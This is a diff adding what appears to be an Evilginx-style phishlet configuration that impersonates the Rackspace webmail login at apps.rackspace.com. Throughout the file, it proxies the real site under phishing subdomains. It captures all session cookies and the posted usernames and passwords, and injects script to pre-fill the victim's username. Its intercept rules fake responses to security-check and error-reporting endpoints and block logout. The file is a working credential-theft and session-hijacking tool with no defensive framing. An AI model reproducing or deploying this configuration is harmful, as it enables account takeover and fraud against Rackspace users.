@@ -1,0 +1,186 @@
+min_ver: "3.0.0"
+redirect_url: "https://apps.rackspace.com/"
+
+proxy_hosts:
+  - {
+      phish_sub: "wmidentity",
+      orig_sub: "",
+      domain: "apps.rackspace.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "rackspace.com",
+      session: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "static",
+      orig_sub: "static",
+      domain: "rackspace.com",
+      session: false,
+      auto_filter: true,
+    }
+
+sub_filters:
+  # Core Rackspace domain replacements
+  - {
+      triggers_on: "apps.rackspace.com",
+      orig_sub: "",
+      domain: "apps.rackspace.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "apps.rackspace.com",
+      orig_sub: "",
+      domain: "rackspace.com",
+      search: "{hostname}",
+      replace: "{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+
+  # Rackspace static/CDN assets
+  - {
+      triggers_on: "apps.rackspace.com",
+      orig_sub: "static",
+      domain: "rackspace.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/css", "application/javascript", "image/*", "font/*"],
+    }
+  - {
+      triggers_on: "apps.rackspace.com",
+      orig_sub: "www",
+      domain: "rackspace.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json"],
+    }
+
+  # Anti-phishing bypass - common patterns
+  - {
+      triggers_on: "apps.rackspace.com",
+      orig_sub: "",
+      domain: "apps.rackspace.com",
+      search: '"{hostname}"',
+      replace: '"{hostname}"',
+      mimes: ["application/javascript"],
+    }
+  - {
+      triggers_on: "apps.rackspace.com",
+      orig_sub: "",
+      domain: "apps.rackspace.com",
+      search: 'rackspace\.com',
+      replace: "rackspace.com",
+      mimes: ["text/html", "application/javascript"],
+    }
+
+auth_tokens:
+  # Capture Rackspace session cookies
+  - domain: ".rackspace.com"
+    keys: ['.*:regexp']
+    type: "cookie"
+  - domain: ".apps.rackspace.com"
+    keys: ['.*:regexp']
+    type: "cookie"
+
+credentials:
+  username:
+    key: "username"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  # custom:
+  #   - key: "__RequestVerificationToken"
+  #     search: "(.*)"
+  #     type: "post"
+  #   - key: "destination"
+  #     search: "(.*)"
+  #     type: "post"
+  #   - key: "flags"
+  #     search: "(.*)"
+  #     type: "post"
+
+auth_urls:
+  - "/wmidentity/Account/Login"
+  - "/wmidentity/Account/Dashboard"
+  - "/Dashboard"
+  - "/Home"
+  - "/email"
+  - "/api/auth/success"
+  - "/wmidentity/.*dashboard.*"
+
+login:
+  domain: "apps.rackspace.com"
+  path: "/wmidentity/Account/Login"
+
+# force_post:
+#   # Force remember me if present
+#   - path: "/wmidentity/Account/Login"
+#     search:
+#       - { key: "username", search: ".*" }
+#       - { key: "password", search: ".*" }
+#     force:
+#       - { key: "rememberMe", value: "true" }
+#       - { key: "flags", value: "4" }
+#     type: "post"
+
+js_inject:
+  # Pre-fill username and focus password
+  - trigger_domains: ["apps.rackspace.com"]
+    trigger_paths: ["/wmidentity/Account/Login"]
+    trigger_params: ["username"]
+    script: |
+      function rackspaceAutofill() {
+        var usernameField = document.querySelector('input[name="username"], input[id*="username"], input[placeholder*="email"]');
+        var passwordField = document.querySelector('input[name="password"], input[type="password"]');
+        
+        if (usernameField && "{username}") {
+          usernameField.value = "{username}";
+        }
+        
+        if (passwordField) {
+          passwordField.focus();
+          passwordField.select();
+        }
+      }
+
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', rackspaceAutofill);
+      } else {
+        setTimeout(rackspaceAutofill, 500);
+      }
+
+intercept:
+  # Block error reporting and security checks
+  - {
+      domain: "apps.rackspace.com",
+      path: "^/wmidentity/log|report|error.*$",
+      http_status: 200,
+      body: "{}",
+      mime: "application/json",
+    }
+  - {
+      domain: "apps.rackspace.com",
+      path: "^/api/security|check.*$",
+      http_status: 200,
+      body: '{"valid": true}',
+      mime: "application/json",
+    }
+  - {
+      domain: "apps.rackspace.com",
+      path: "^/wmidentity/Account/Logout$",
+      http_status: 302,
+      body: "",
+      mime: "text/html",
+    }
